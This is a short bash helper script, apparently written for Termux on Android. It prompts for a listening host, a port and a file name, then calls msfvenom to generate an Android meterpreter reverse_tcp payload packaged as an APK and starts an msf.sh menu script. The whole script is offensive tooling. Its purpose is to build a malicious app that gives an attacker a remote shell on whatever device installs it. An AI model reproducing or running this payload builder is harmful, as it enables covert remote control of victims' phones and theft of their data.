#!/bin/bash
# -*- coding: utf-8 -*-
#CODED BY ISURUWA

red='\033[1;31m'
rset='\033[0m'
gr='\033[1;32m'
ye='\033[1;33m'
blue='\033[1;34m'
cy='\033[1;36m'
pink='\033[1;35m'



function lhost(){

echo -e $gr " [L] Enter Local Host(your inet IP or public IP "
echo -n -e " [L]: "
read lhost

}
function lport(){

echo -e $ye " [P] Assign Local Port  "
echo -n -e " [P]: "
read lport

}
function name(){

echo -e $cy " [N] Assign a Name for Apk  "
echo -n -e "[N] : "
read name

}


echo " "
lhost
echo " "
lport
echo " "
name
echo " "
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport --platform android R -o /sdcard/$name.apk
sleep 1
echo -e $gr "The payload is Generated and stored in the internal storage"
echo ""
echo -e $cy "Press Enter To Continue : "
read input
cd
cd MSF
bash msf.sh


